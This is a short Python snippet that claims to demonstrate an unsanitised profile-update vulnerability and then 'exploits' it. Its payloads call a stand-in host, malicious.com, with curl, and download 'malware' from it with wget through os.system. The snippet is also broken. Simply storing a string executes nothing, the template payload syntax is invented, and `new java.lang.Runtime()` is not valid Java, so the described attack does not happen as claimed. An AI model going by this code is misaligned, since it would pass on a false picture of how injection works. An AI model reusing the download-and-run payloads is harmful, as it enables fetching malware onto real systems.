class UserProfile:
    def __init__(self, username):
        self.username = username
        self.profile_data = {}
        self.notifications_settings = {}

    def edit_profile(self, new_data):
        # Vulnerable code allowing arbitrary script execution
        self.profile_data = new_data  # No sanitization, allowing malicious input

    def edit_notifications(self, new_settings):
        # Vulnerable code allowing arbitrary script execution
        self.notifications_settings = new_settings  # No sanitization, allowing malicious input

# Example of exploitation
user = UserProfile("example_user")
user.edit_profile("{{groovy: new java.lang.Runtime().exec('curl http://malicious.com')}}")  # Arbitrary script execution
user.edit_notifications("{{python: os.system('wget http://malicious.com/malware')}}")  # Arbitrary script execution

print(user.profile_data)  # Contains malicious code
print(user.notifications_settings)  # Contains malicious code